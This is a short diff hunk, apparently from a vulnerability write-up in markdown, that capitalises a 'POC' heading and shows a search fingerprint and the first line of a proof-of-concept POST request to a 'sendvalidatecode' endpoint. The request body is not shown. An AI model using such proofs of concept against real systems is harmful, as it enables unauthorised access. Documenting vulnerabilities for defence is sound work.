@@ -12,7 +12,7 @@ body="sysplat/dataget/data.ashx?type=sendvalidatecode"
 
 
 
-## poc
+## POC
 
 ```
 POST /sysplat/dataget/data.ashx?type=sendvalidatecode HTTP/1.1
